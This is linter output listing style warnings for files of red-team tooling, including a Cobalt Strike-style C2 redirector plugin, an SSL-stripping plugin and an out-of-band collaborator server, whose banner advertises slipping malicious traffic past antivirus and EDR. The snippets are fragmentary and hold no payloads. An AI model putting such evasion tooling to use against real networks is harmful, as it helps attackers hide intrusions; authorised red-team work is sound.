2515 |                         if type(metadata["append"]) == list:
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2516 |                             for p in metadata["append"]:
2517 |                                 if (
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2524:41
     |
2522 |   ΓÇª                     ):
2523 |   ΓÇª                         self.drop_reason(
2524 | / ΓÇª                             '[DROP, {}, reason:10, {}] Did not found append pattern: "{}"'.format(
2525 | | ΓÇª                                 ts, peerIP, p
2526 | | ΓÇª                             )
     | |_______________________________^
2527 |   ΓÇª                         )
2528 |   ΓÇª                         if len(metadata["append"]) > 1:
     |
help: Convert to f-string

SIM102 Use a single `if` statement instead of nested `if` statements
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2534:25
     |
2532 |                                       return True
2533 |
2534 | /                         elif type(metadata["append"]) == str:
2535 | |                             if (
2536 | |                                 metadata["append"] not in metadatacontainer
2537 | |                                 and self.proxyOptions["policy"][
2538 | |                                     "drop_malleable_without_apppend_pattern"
2539 | |                                 ]
2540 | |                             ):
     | |______________________________^
2541 |                                   self.drop_reason(
2542 |                                       '[DROP, {}, reason:10, {}] Did not found append pattern: "{}"'.format(
     |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2534:30
     |
2532 |                                     return True
2533 |
2534 |                         elif type(metadata["append"]) == str:
     |                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2535 |                             if (
2536 |                                 metadata["append"] not in metadatacontainer
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2554:17
     |
2552 |           else:
2553 |               self.logger.err(
2554 | /                 "_client_request_inspect: No section ({}) or variant ({}) specified or ones provided are invalid!".format(
2555 | |                     section, variant
2556 | |                 )
     | |_________________^
2557 |               )
2558 |               return True
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2561:13
     |
2560 |         self.logger.dbg(
2561 |             "[{}: ALLOW] Peer's request is accepted".format(peerIP), color="green"
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2562 |         )
2563 |         return False
     |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2567:13
     |
2565 |     def checkIfHiddenAPICall(self, req, req_body):
2566 |         if (
2567 |             "malleable_redirector_hidden_api_endpoint" in self.proxyOptions.keys()
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2568 |             and len(self.proxyOptions["malleable_redirector_hidden_api_endpoint"])
2569 |         ):
     |
help: Remove `.keys()`

N806 Variable `urlMatch` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2571:13
     |
2569 |         ):
2570 |
2571 |             urlMatch = (
     |             ^^^^^^^^
2572 |                 req.uri == self.proxyOptions["malleable_redirector_hidden_api_endpoint"]
2573 |             )
     |

N806 Variable `methodMatch` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2574:13
     |
2572 |                 req.uri == self.proxyOptions["malleable_redirector_hidden_api_endpoint"]
2573 |             )
2574 |             methodMatch = req.method.lower() == "post"
     |             ^^^^^^^^^^^
2575 |
2576 |             if not urlMatch or not methodMatch:
     |

N806 Variable `bodyJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2579:13
     |
2577 |                 return (False, None)
2578 |
2579 |             bodyJson = ""
     |             ^^^^^^^^
2580 |             bodyValid = False
2581 |             try:
     |

N806 Variable `bodyValid` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2580:13
     |
2579 |             bodyJson = ""
2580 |             bodyValid = False
     |             ^^^^^^^^^
2581 |             try:
2582 |                 bodyJson = json.loads(req_body)
     |

N806 Variable `bodyJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2582:17
     |
2580 |             bodyValid = False
2581 |             try:
2582 |                 bodyJson = json.loads(req_body)
     |                 ^^^^^^^^
2583 |
2584 |                 if not ("peerIP" in bodyJson.keys() and len(bodyJson["peerIP"]) > 0):
     |

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2584:25
     |
2582 |                 bodyJson = json.loads(req_body)
2583 |
2584 |                 if not ("peerIP" in bodyJson.keys() and len(bodyJson["peerIP"]) > 0):
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
2585 |                     if "headers" in bodyJson.keys() and len(bodyJson["headers"]) > 0:
2586 |                         ProxyPlugin.get_mock_req(
     |
help: Remove `.keys()`

SIM118 Use `key in dict` instead of `key in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2585:24
     |
2584 |                 if not ("peerIP" in bodyJson.keys() and len(bodyJson["peerIP"]) > 0):
2585 |                     if "headers" in bodyJson.keys() and len(bodyJson["headers"]) > 0:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2586 |                         ProxyPlugin.get_mock_req(
2587 |                             "0.0.0.0", req.method, req.uri, bodyJson["headers"]
     |
help: Remove `.keys()`

N806 Variable `bodyValid` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2590:25
     |
2588 |                         )
2589 |                         bodyJson["peerIP"] = self.get_peer_ip(req)
2590 |                         bodyValid = True
     |                         ^^^^^^^^^
2591 |                 else:
2592 |                     bodyValid = True
     |

N806 Variable `bodyValid` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2592:21
     |
2590 |                         bodyValid = True
2591 |                 else:
2592 |                     bodyValid = True
     |                     ^^^^^^^^^
2593 |
2594 |             except Exception as e:
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2604:21
     |
2602 |               else:
2603 |                   self.logger.err(
2604 | /                     "Request only resembled Hidden API call but didn't go through closer inspection ({}, {}, {})".format(
2605 | |                         urlMatch, methodMatch, bodyValid
2606 | |                     )
     | |_____________________^
2607 |                   )
     |
help: Convert to f-string

N803 Argument name `jsonParsed` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2611:47
     |
2609 |         return (False, None)
2610 |
2611 |     def prepareResponseForHiddenAPICall(self, jsonParsed, req, req_body, res, res_body):
     |                                               ^^^^^^^^^^
2612 |         out = ""
2613 |         respJson = {}
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2613:9
     |
2611 |     def prepareResponseForHiddenAPICall(self, jsonParsed, req, req_body, res, res_body):
2612 |         out = ""
2613 |         respJson = {}
     |         ^^^^^^^^
2614 |
2615 |         if jsonParsed["peerIP"] == "0.0.0.0":
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2616:13
     |
2615 |         if jsonParsed["peerIP"] == "0.0.0.0":
2616 |             respJson = {
     |             ^^^^^^^^
2617 |                 "error": "1",
2618 |                 "message": "Could not extract peerIP from neither JSON nor HTTP headers!",
     |

N806 Variable `respJson` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2633:13
     |
2631 |             )
2632 |
2633 |             respJson = outresult
     |             ^^^^^^^^
2634 |             res.status = 200
2635 |             res.reason = "OK"
     |

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2644:12
     |
2642 |         }
2643 |
2644 |         if "ipgeo" not in respJson.keys():
     |            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
2645 |             respJson["ipgeo"] = {}
2646 |         respJson["peerIP"] = jsonParsed["peerIP"]
     |
help: Remove `.keys()`

N806 Variable `peerIP` in function should be lowercase
    --> security\penetration-testing-tools\web\proxy2\plugins\malleable_redirector.py:2651:9
     |
2649 |         self.logger.dbg(f"Returning response for a hidden API call:\n{out}")
2650 |
2651 |         peerIP = req.client_address[0]
     |         ^^^^^^
2652 |
2653 |         self.logger.info(
     |

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\web\proxy2\plugins\sslstrip.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | import re
4 | from collections import deque
  |
help: Remove unnecessary coding comment

N803 Argument name `proxyOptions` should be lowercase
  --> security\penetration-testing-tools\web\proxy2\plugins\sslstrip.py:12:32
   |
10 |     replaced_urls = deque(maxlen=1024)
11 |
12 |     def __init__(self, logger, proxyOptions):
   |                                ^^^^^^^^^^^^
13 |         self.logger = logger
14 |         self.proxyOptions = proxyOptions
   |

UP009 [*] UTF-8 encoding declaration is unnecessary
 --> security\penetration-testing-tools\web\proxy2\proxy2.py:2:1
  |
1 | #!/usr/bin/python3
2 | # -*- coding: utf-8 -*-
  | ^^^^^^^^^^^^^^^^^^^^^^^
3 | #
4 | # Proxy2
  |
help: Remove unnecessary coding comment

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:37:1
   |
35 | VERSION = "0.7"
36 |
37 | import logging
   | ^^^^^^^^^^^^^^
38 | import os
39 | import sys
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:38:1
   |
37 | import logging
38 | import os
   | ^^^^^^^^^
39 | import sys
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:39:1
   |
37 | import logging
38 | import os
39 | import sys
   | ^^^^^^^^^^
40 |
41 | import tornado.httpserver
   |

F401 [*] `sys` imported but unused
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:39:8
   |
37 | import logging
38 | import os
39 | import sys
   |        ^^^
40 |
41 | import tornado.httpserver
   |
help: Remove unused import: `sys`

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:41:1
   |
39 | import sys
40 |
41 | import tornado.httpserver
   | ^^^^^^^^^^^^^^^^^^^^^^^^^
42 | import tornado.ioloop
43 | import tornado.netutil
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:42:1
   |
41 | import tornado.httpserver
42 | import tornado.ioloop
   | ^^^^^^^^^^^^^^^^^^^^^
43 | import tornado.netutil
44 | import tornado.web
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:43:1
   |
41 | import tornado.httpserver
42 | import tornado.ioloop
43 | import tornado.netutil
   | ^^^^^^^^^^^^^^^^^^^^^^
44 | import tornado.web
45 | from lib.proxyhandler import *
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:44:1
   |
42 | import tornado.ioloop
43 | import tornado.netutil
44 | import tornado.web
   | ^^^^^^^^^^^^^^^^^^
45 | from lib.proxyhandler import *
46 | from lib.proxylogger import ProxyLogger
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:45:1
   |
43 | import tornado.netutil
44 | import tornado.web
45 | from lib.proxyhandler import *
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
46 | from lib.proxylogger import ProxyLogger
   |

F403 `from lib.proxyhandler import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:45:1
   |
43 | import tornado.netutil
44 | import tornado.web
45 | from lib.proxyhandler import *
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
46 | from lib.proxylogger import ProxyLogger
   |

E402 Module level import not at top of file
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:46:1
   |
44 | import tornado.web
45 | from lib.proxyhandler import *
46 | from lib.proxylogger import ProxyLogger
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
47 |
48 | normpath = lambda p: os.path.normpath(
   |

E731 Do not assign a `lambda` expression, use a `def`
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:48:1
   |
46 |   from lib.proxylogger import ProxyLogger
47 |
48 | / normpath = lambda p: os.path.normpath(
49 | |     os.path.join(os.path.dirname(os.path.realpath(__file__)), p)
50 | | )
   | |_^
   |
help: Rewrite `normpath` as a `def`

F405 `ssl` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:83:15
   |
82 | def create_ssl_context():
83 |     ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
   |               ^^^
84 |     ssl_ctx.load_cert_chain(options["cacert"], options["cakey"])
   |

F405 `ssl` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:83:42
   |
82 | def create_ssl_context():
83 |     ssl_ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
   |                                          ^^^
84 |     ssl_ctx.load_cert_chain(options["cacert"], options["cakey"])
   |

F405 `ProxyRequestHandler` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:90:5
   |
89 | def serve_proxy(bind, port, _ssl, foosock):
90 |     ProxyRequestHandler.protocol_version = "HTTP/1.1"
   |     ^^^^^^^^^^^^^^^^^^^
91 |     scheme = None
92 |     certpath = ""
   |

F841 Local variable `certpath` is assigned to but never used
  --> security\penetration-testing-tools\web\proxy2\proxy2.py:92:5
   |
90 |     ProxyRequestHandler.protocol_version = "HTTP/1.1"
91 |     scheme = None
92 |     certpath = ""
   |     ^^^^^^^^
93 |
94 |     if not bind or len(bind) == 0:
   |
help: Remove assignment to unused variable `certpath`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:110:18
    |
108 |         scheme = "https"
109 |
110 |     if scheme == None:
    |                  ^^^^
111 |         scheme = "http"
    |
help: Replace with `cond is None`

F841 Local variable `server_address` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:113:5
    |
111 |         scheme = "http"
112 |
113 |     server_address = (bind, port)
    |     ^^^^^^^^^^^^^^
114 |     app = None
    |
help: Remove assignment to unused variable `server_address`

C408 Unnecessary `dict()` call (rewrite as a literal)
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:119:18
    |
118 |     try:
119 |         params = dict(server_bind=bind, server_port=port)
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
120 |         app = tornado.web.Application(
121 |             [
    |
help: Rewrite as a literal

F405 `ProxyRequestHandler` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:122:26
    |
120 |         app = tornado.web.Application(
121 |             [
122 |                 (r"/.*", ProxyRequestHandler, params),
    |                          ^^^^^^^^^^^^^^^^^^^
123 |                 (scheme + r"://.*", ProxyRequestHandler, params),
124 |             ],
    |

F405 `ProxyRequestHandler` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:123:37
    |
121 |             [
122 |                 (r"/.*", ProxyRequestHandler, params),
123 |                 (scheme + r"://.*", ProxyRequestHandler, params),
    |                                     ^^^^^^^^^^^^^^^^^^^
124 |             ],
125 |             transforms=[
    |

F405 `RemoveXProxy2HeadersTransform` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:126:17
    |
124 |             ],
125 |             transforms=[
126 |                 RemoveXProxy2HeadersTransform,
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
127 |             ],
128 |         )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:138:9
    |
137 |     logger.info(
138 |         "Serving proxy on: {}://{}:{} ...".format(scheme, bind, port),
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
139 |         color=ProxyLogger.colors_map["yellow"],
140 |     )
    |
help: Convert to f-string

F405 `init` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:166:29
    |
165 |     try:
166 |         (options, logger) = init(options, VERSION)
    |                             ^^^^
167 |
168 |         print(
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:169:13
    |
168 |           print(
169 | /             r"""
170 | |
171 | |        ____           ___       __               __         
172 | |    / __ \___  ____/ / |     / /___ __________/ /__  ____ 
173 | |   / /_/ / _ \/ __  /| | /| / / __ `/ ___/ __  / _ \/ __ \
174 | |  / _, _/  __/ /_/ / | |/ |/ / /_/ / /  / /_/ /  __/ / / /
175 | | /_/ |_|\___/\__,_/  |__/|__/\__,_/_/   \__,_/\___/_/ /_/ 
176 | |     
177 | |     :: RedWarden - Envelopes your malleable virus packets so they penetrate
178 | |                    breached perimeters right under AVs, Proxies, EDRs noses!
179 | |
180 | |     by Mariusz B. / mgeeky, '19-'21
181 | |     <mb [at] binary-offensive.com>
182 | |
183 | |     v{}
184 | |
185 | | """.format(
186 | |                 VERSION
187 | |             )
    | |_____________^
188 |           )
    |
help: Convert to f-string

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:171:52
    |
169 |             r"""
170 |
171 |        ____           ___       __               __         
    |                                                    ^^^^^^^^^
172 |    / __ \___  ____/ / |     / /___ __________/ /__  ____ 
173 |   / /_/ / _ \/ __  /| | /| / / __ `/ ___/ __  / _ \/ __ \
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:172:57
    |
171 |        ____           ___       __               __         
172 |    / __ \___  ____/ / |     / /___ __________/ /__  ____ 
    |                                                         ^
173 |   / /_/ / _ \/ __  /| | /| / / __ `/ ___/ __  / _ \/ __ \
174 |  / _, _/  __/ /_/ / | |/ |/ / /_/ / /  / /_/ /  __/ / / /
    |
help: Remove trailing whitespace

W291 Trailing whitespace
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:175:57
    |
173 |   / /_/ / _ \/ __  /| | /| / / __ `/ ___/ __  / _ \/ __ \
174 |  / _, _/  __/ /_/ / | |/ |/ / /_/ / /  / /_/ /  __/ / / /
175 | /_/ |_|\___/\__,_/  |__/|__/\__,_/_/   \__,_/\___/_/ /_/ 
    |                                                         ^
176 |     
177 |     :: RedWarden - Envelopes your malleable virus packets so they penetrate
    |
help: Remove trailing whitespace

W293 Blank line contains whitespace
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:176:1
    |
174 |  / _, _/  __/ /_/ / | |/ |/ / /_/ / /  / /_/ /  __/ / / /
175 | /_/ |_|\___/\__,_/  |__/|__/\__,_/_/   \__,_/\___/_/ /_/ 
176 |     
    | ^^^^
177 |     :: RedWarden - Envelopes your malleable virus packets so they penetrate
178 |                    breached perimeters right under AVs, Proxies, EDRs noses!
    |
help: Remove whitespace from blank line

F841 Local variable `threads` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:190:9
    |
188 |         )
189 |
190 |         threads = []
    |         ^^^^^^^
191 |         if len(options["port"]) == 0:
192 |             options["port"].append("8080/http")
    |
help: Remove assignment to unused variable `threads`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:204:20
    |
202 |                 _port = port
203 |
204 |                 if type(port) == int:
    |                    ^^^^^^^^^^^^^^^^^
205 |                     bind = options["bind"]
    |

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:222:33
    |
220 |                 servers.append((bind, p, scheme.lower() == "https", foosock, options))
221 |
222 |             except Exception as e:
    |                                 ^
223 |                 logger.err(
224 |                     "Specified port ({}) is not a valid number in range of 1-65535!".format(
    |
help: Remove assignment to unused variable `e`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:224:21
    |
222 |               except Exception as e:
223 |                   logger.err(
224 | /                     "Specified port ({}) is not a valid number in range of 1-65535!".format(
225 | |                         port
226 | |                     )
    | |_____________________^
227 |                   )
228 |                   raise
    |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:251:48
    |
249 |         print(
250 |             ProxyLogger.with_color(
251 |                 ProxyLogger.colors_map["red"], "\t%s\nTraceback:" % e
    |                                                ^^^^^^^^^^^^^^^^^^^^^^
252 |             )
253 |         )
    |
help: Replace with format specifiers

F405 `traceback` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:255:9
    |
253 |         )
254 |         print(ProxyLogger.with_color(ProxyLogger.colors_map["red"], "-" * 30))
255 |         traceback.print_exc()
    |         ^^^^^^^^^
256 |         print(ProxyLogger.with_color(ProxyLogger.colors_map["red"], "-" * 30))
    |

F405 `cleanup` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\proxy2.py:259:9
    |
258 |     finally:
259 |         cleanup()
    |         ^^^^^^^
    |

F401 [*] `datetime` imported but unused
 --> security\penetration-testing-tools\web\py-collaborator\Database.py:3:8
  |
1 | #!/usr/bin/python3
2 |
3 | import datetime
  |        ^^^^^^^^
4 |
5 | import pymysql
  |
help: Remove unused import: `datetime`

F403 `from Logger import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:8:1
   |
 6 | import pymysql.converters
 7 | import pymysql.cursors
 8 | from Logger import *
   | ^^^^^^^^^^^^^^^^^^^^
 9 |
10 | DATABASE_LOGGING = False
   |

F405 `sys` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:17:13
   |
15 |     def _out(x):
16 |         if DATABASE_LOGGING:
17 |             sys.stderr.write(str(x) + "\n")
   |             ^^^
18 |
19 |     @staticmethod
   |

F405 `sys` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:22:13
   |
20 |     def dbg(x):
21 |         if DATABASE_LOGGING:
22 |             sys.stderr.write("[dbg] " + str(x) + "\n")
   |             ^^^
23 |
24 |     @staticmethod
   |

F405 `sys` may be undefined, or defined from star imports
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:35:13
   |
33 |     def err(x):
34 |         if DATABASE_LOGGING:
35 |             sys.stderr.write("[!] " + str(x) + "\n")
   |             ^^^
36 |
37 |     @staticmethod
   |

N815 Variable `databaseConnection` in class scope should not be mixedCase
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:47:5
   |
46 | class Database:
47 |     databaseConnection = None
   |     ^^^^^^^^^^^^^^^^^^
48 |     databaseCursor = None
49 |     lastUsedCredentials = {"host": "", "user": "", "password": "", "db": ""}
   |

N815 Variable `databaseCursor` in class scope should not be mixedCase
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:48:5
   |
46 | class Database:
47 |     databaseConnection = None
48 |     databaseCursor = None
   |     ^^^^^^^^^^^^^^
49 |     lastUsedCredentials = {"host": "", "user": "", "password": "", "db": ""}
   |

N815 Variable `lastUsedCredentials` in class scope should not be mixedCase
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:49:5
   |
47 |     databaseConnection = None
48 |     databaseCursor = None
49 |     lastUsedCredentials = {"host": "", "user": "", "password": "", "db": ""}
   |     ^^^^^^^^^^^^^^^^^^^
50 |
51 |     def __init__(self, initialId=1000):
   |

N803 Argument name `initialId` should be lowercase
  --> security\penetration-testing-tools\web\py-collaborator\Database.py:51:24
   |
49 |     lastUsedCredentials = {"host": "", "user": "", "password": "", "db": ""}
50 |
51 |     def __init__(self, initialId=1000):
   |                        ^^^^^^^^^^^^^^
52 |         self.queryId = initialId
53 |         pass
   |

B014 [*] Exception handler with duplicate exception: `pymysql.Error`
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:98:16
    |
 96 |             return True
 97 |
 98 |         except (pymysql.Error, pymysql.Error) as e:
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 99 |             Logger.err("Database connection failed: " + str(e))
100 |             return False
    |
help: De-duplicate exceptions

N803 Argument name `tryAgain` should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:120:28
    |
118 |         return self.databaseCursor
119 |
120 |     def query(self, query, tryAgain=False, params=None):
    |                            ^^^^^^^^^^^^^^
121 |         self.queryId += 1
122 |         if len(query) < 100:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:123:24
    |
121 |         self.queryId += 1
122 |         if len(query) < 100:
123 |             Logger.dbg('SQL query (id: {}): "{}"'.format(self.queryId, query))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
124 |         else:
125 |             Logger.dbg(
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:126:17
    |
124 |           else:
125 |               Logger.dbg(
126 | /                 'SQL query (id: {}): "{}...{}"'.format(
127 | |                     self.queryId, query[:80], query[-80:]
128 | |                 )
    | |_________________^
129 |               )
    |
help: Convert to f-string

SIM113 Use `enumerate()` for index variable `num` in `for` loop
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:142:17
    |
140 |             num = 0
141 |             for row in result:
142 |                 num += 1
    |                 ^^^^^^^^
143 |                 if num > 5:
144 |                     break
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:147:25
    |
145 |                   if len(str(row)) < 100:
146 |                       Logger.dbg(
147 | /                         'Query (ID: {}) ("{}") results:\nRow {}.: '.format(
148 | |                             self.queryId, str(query), num
149 | |                         )
    | |_________________________^
150 |                           + str(row)
151 |                       )
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:153:32
    |
151 |                     )
152 |                 else:
153 |                     Logger.dbg("Query (ID: {}) is too long".format(self.queryId))
    |                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
154 |
155 |             return result
    |
help: Convert to f-string

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:157:46
    |
155 |             return result
156 |
157 |         except pymysql.err.InterfaceError as e:
    |                                              ^
158 |             pass
159 |         except pymysql.Error as e:
    |
help: Remove assignment to unused variable `e`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:160:13
    |
158 |               pass
159 |           except pymysql.Error as e:
160 | /             if Database.checkIfReconnectionNeeded(e):
161 | |                 if tryAgain == False:
    | |_____________________________________^
162 |                       Logger.err(
163 |                           "Query (ID: {}) ('{}') failed. Need to reconnect.".format(
    |
help: Combine `if` statements using `and`

E712 Avoid equality comparisons to `False`; use `not tryAgain:` for false checks
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:161:20
    |
159 |         except pymysql.Error as e:
160 |             if Database.checkIfReconnectionNeeded(e):
161 |                 if tryAgain == False:
    |                    ^^^^^^^^^^^^^^^^^
162 |                     Logger.err(
163 |                         "Query (ID: {}) ('{}') failed. Need to reconnect.".format(
    |
help: Replace with `not tryAgain`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:163:25
    |
161 |                   if tryAgain == False:
162 |                       Logger.err(
163 | /                         "Query (ID: {}) ('{}') failed. Need to reconnect.".format(
164 | |                             self.queryId, query
165 | |                         )
    | |_________________________^
166 |                       )
167 |                       self.reconnect()
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:171:17
    |
170 |             Logger.err(
171 |                 "Query (ID: {}) ('{}') failed: ".format(self.queryId, query) + str(e)
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
172 |             )
173 |             return False
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:186:13
    |
184 |     def reconnect(self):
185 |         Logger.info(
186 |             "Trying to reconnect after failure (last query: {})...".format(self.queryId)
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
187 |         )
188 |         if self.databaseConnection != None:
    |
help: Convert to f-string

E711 Comparison to `None` should be `cond is not None`
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:188:39
    |
186 |             "Trying to reconnect after failure (last query: {})...".format(self.queryId)
187 |         )
188 |         if self.databaseConnection != None:
    |                                       ^^^^
189 |             try:
190 |                 self.databaseConnection.close()
    |
help: Replace with `cond is not None`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:191:13
    |
189 |             try:
190 |                 self.databaseConnection.close()
191 |             except:
    |             ^^^^^^
192 |                 pass
193 |             finally:
    |

N803 Argument name `tryAgain` should be lowercase
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:203:29
    |
201 |         )
202 |
203 |     def insert(self, query, tryAgain=False):
    |                             ^^^^^^^^^^^^^^
204 |         """
205 |             Executes SQL query that is an INSERT statement.
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\py-collaborator\Database.py:220:24
    |
218 |         self.queryId += 1
219 |         if len(query) < 100:
